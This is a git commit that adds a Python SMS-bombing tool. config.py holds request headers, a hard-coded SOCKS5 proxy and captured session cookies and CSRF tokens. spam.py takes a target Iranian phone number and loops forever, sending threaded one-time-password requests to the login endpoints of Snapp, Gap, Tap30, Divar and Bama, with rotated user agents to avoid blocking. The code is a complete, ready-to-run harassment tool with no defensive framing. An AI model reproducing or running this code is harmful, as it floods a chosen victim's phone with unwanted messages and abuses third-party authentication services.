d424b892c1c7bea869d20b5165f59586d40c6535
SlavPH <110917771+SlavPH@users.noreply.github.com>
2022-08-09 14:28:27 +0000

    Add files via upload

---
+++ config.py
@@ -0,0 +1,142 @@
+#!/usr/bin/env python3
+
+# Libraries
+import random
+
+
+# Colors
+black='\033[1;90m'      # Black
+red='\033[1;91m'        # Red
+green='\033[1;92m'      # Green
+yellow='\033[1;93m'     # Yellow
+blue='\033[1;94m'       # Blue
+purple='\033[1;95m'     # Purple
+cyan='\033[1;96m'       # Cyan
+white='\033[1;97m'      # White
+reset='\033[0m'         # Reset
+
+# Logo
+logo = (f"""
+{cyan}  _________                             {purple}_______________.___.
+{cyan} /   _____/ ______   _____      _____   {purple}\______   \__  |   |
+{cyan} \_____  \  \____ \  \__  \    /     \  {purple} |     ___//   |   |
+{cyan} /        \ |  |_> |  / __ \_ |  Y Y  \ {purple} |    |    \____   |
+{cyan}/_______  / |   __/  (____  / |__|_|  / {purple} |____|    / ______|
+{cyan}        \/  |__|          \/        \/  {purple}           \/       
+{reset}
+""")
+
+# user agents
+user_agents = [
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
+    "Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
+    "Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
+    "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
+    "Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
+    "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
+    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
+    "Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)"
+]
+
+# Tor proxy
+# proxy = {
+#     'http': 'socks5://localhost:9050',
+#     'https': 'socks5://localhost:9050'
+# }
+
+# other proxies
+proxy = {
+    'socks5' : '192.111.137.37:18762'
+}
+
+# Headers
+SnappHeader = {
+    "Host": "app.snapp.taxi", 
+    "content-length": "29", 
+    "x-app-name": "passenger-pwa", 
+    "x-app-version": "5.0.0", 
+    "app-version": "pwa", 
+    "user-agent": "".join(random.choices(user_agents)), 
+    "content-type": "application/json", 
+    "accept": "*/*", "origin": "https://app.snapp.taxi", 
+    "sec-fetch-site": "same-origin", 
+    "sec-fetch-mode": "cors", 
+    "sec-fetch-dest": "empty", 
+    "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", 
+    "accept-encoding": "gzip, deflate, br", 
+    "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", 
+    "cookie": "_gat\u003d1"
+}
+
+
+GapHeader = {
+    "Host": "core.gap.im",
+    "accept": "application/json, text/plain, */*",
+    "x-version": "4.5.7",
+    "accept-language": "fa",
+    "user-agent": "".join(random.choices(user_agents)),
+    "appversion": "web",
+    "origin": "https://web.gap.im",
+    "sec-fetch-site": "same-site",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-dest": "empty",
+    "referer": "https://web.gap.im/",
+    "accept-encoding": "gzip, deflate, br"
+}
+
+Tap30Header = {
+    "Host": "tap33.me",
+    "Connection": "keep-alive",
+    "Content-Length": "63",
+    "User-Agent": "".join(random.choices(user_agents)),
+    "content-type": "application/json",
+    "Accept": "*/*",
+    "Origin": "https://app.tapsi.cab",
+    "Sec-Fetch-Site": "cross-site",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+    "Referer": "https://app.tapsi.cab/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"
+}
+
+DivarHeader = {
+    "Host": "api.divar.ir",
+    "Connection": "keep-alive",
+    "Content-Length": "22",
+    "Accept": "application/json, text/plain, */*",
+    "User-Agent": "".join(random.choices(user_agents)),
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "https://divar.ir",
+    "Sec-Fetch-Site": "same-site",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+    "Referer": "https://divar.ir/my-divar/my-posts",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"
+}
+
+BamaHeader = {
+    "authority": "bama.ir",
+    "method": "POST",
+    "user-agent": "".join(random.choices(user_agents)), 
+    "path": "/signin-send-otp",
+    "scheme": "https",
+    "accept": "application/json, text/javascript, */*; q=0.01",
+    "accept-encoding": "gzip, deflate, br",
+    "accept-language": "en-US,en;q=0.9,fa;q=0.8",
+    "content-length": "22",
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "cookie": "__cf_bm=dpfdTuYlw7TCbyGWi4bqMm404f.jQgKWjKlswZRqNkE-1630749094-0-ASFpgeyWkIEaiHCNZpjFg6HvoaCKKFdse8ua169vw5K/KL+fVm9XPkSepMf6YHTLoxENZmecrF/nB6Iy7d+SjEfDPagaU8pkk+Dehh6OrEI44kOrafgPq0iDgLWduZiT2llyKryxIB94lp0JvdZsR9k+CjSOvowRAAM571uM6RgA; __cflb=02DiuFDZJj38KoK7EoAEWmzXoRsWGNYCNVpAriwD2t2s6; _ga=GA1.2.314976238.1630749108; _gid=GA1.2.1461821543.1630749108; _gat_gtag_UA_119698040_4=1; _gat_UA-119698040-4=1; CSRF-TOKEN-BAMA-COOKIE=CfDJ8J1kbi79JwRGrK8gPtbQQY76KnJGEAibnLsGWm9b6IQGXQY7Bqn6hngT1kjB9Z49KyKDM2_NyJRmO3AJVobkUBTvT7s_XQCwSHN9URwNE3-po1-sg2ormefggFAtDGEON_Hl73oyKWXFwEHnb3ILXVU",
+    "csrf-token-bama-header": "CfDJ8J1kbi79JwRGrK8gPtbQQY7V0S5EeReRhhpjBoePccND89QJ7HLNBqzJkLpmmW4pgjHoLTwx9lHhC6cxHUGSDYxAQUxhYBchVaZ2LGTQmPAIsn-JFikRSyIy6MZCls3webta3kMfBvbbnGM2pj5OSTA",
+    "origin": "https://bama.ir",
+    "referer": "https://bama.ir/Signin?ReturnUrl=%2Fprofile",
+    "sec-ch-ua": '"Google Chrome";v="93"," Not;A Brand";v="99","Chromium";v="93"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "Windows",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "x-requested-with": "XMLHttpRequest"
+}
---
+++ spam.py
@@ -0,0 +1,122 @@
+#!/usr/bin/env python3
+
+# Libraries
+import os
+import sys
+import time
+import requests
+from threading import Thread
+
+# Config
+config = open("config.py", "r").read()
+exec(config)
+
+# Clear
+os.system("clear")
+
+# Logo
+for char in logo:
+    sys.stdout.write(char)
+    sys.stdout.flush()
+    time.sleep(0.003) 
+
+# Snapp
+def snapp(phone):
+    global SnappHeader
+
+    SnappData = {
+        "cellphone":phone
+        }
+
+    try:
+        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=proxy)
+        if "OK" in SnapRequest.text:
+            print(f"{green}True: {white}Snapp{reset}")
+        else:
+            pass
+    except:
+        pass
+
+# Gap
+def gap(phone):
+    global GapHeader
+
+    try:
+        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=proxy)
+        if "OK" in GapRequest.text:
+            print(f"{green}True: {white}Gap{reset}")
+        else:
+            pass
+    except:
+        pass
+
+# Tap30
+def tap30(phone):
+    global Tap30Header
+
+    Tap30Data = {
+        "credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}
+        }
+
+    try:
+        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=proxy)
+        if "OK" in Tap30Request.text:
+            print(f"{green}True: {white}Tap30{reset}")
+        else:
+            pass
+    except:
+        pass
+
+# Divar
+def divar(phone):
+    global DivarHeader
+        
+    DivarData = {
+        "phone":phone.split("+98")[1]
+        }
+
+    try:
+        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=proxy)
+        if "SENT" in DivarRequest.text:
+            print(f"{green}True: {white}Divar{reset}")
+        else:
+            pass
+    except:
+        pass
+
+# Bama
+def bama(phone):
+    global BamaHeader
+
+    BamaData = "cellNumber=0"+phone.split("+98")[1]
+
+    try:
+        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=proxy)
+        if "0" in BamaRequest.text:
+            print(f"{green}True: {white}Bama{reset}")
+        else:
+            pass
+    except:
+        pass
+
+# Main
+def main():
+    phone = input(f"{cyan}Enter target (+98xxxxxxxxxx) : {reset}")
+    print (f"{purple}Spam Started!{reset}\n")
+
+    while True:
+        Thread(target=snapp, args=[phone]).start()   # Snapp
+        time.sleep(0.5)
+        Thread(target=gap, args=[phone]).start()     # Gap
+        time.sleep(0.5)
+        Thread(target=tap30, args=[phone]).start()   # Tap30
+        time.sleep(0.5)
+        Thread(target=divar, args=[phone]).start()   # Divar
+        time.sleep(0.5)
+        Thread(target=bama, args=[phone]).start()    # Bama
+        time.sleep(0.5)        
+
+if __name__ == "__main__":
+    main()
+
+# SlavPH
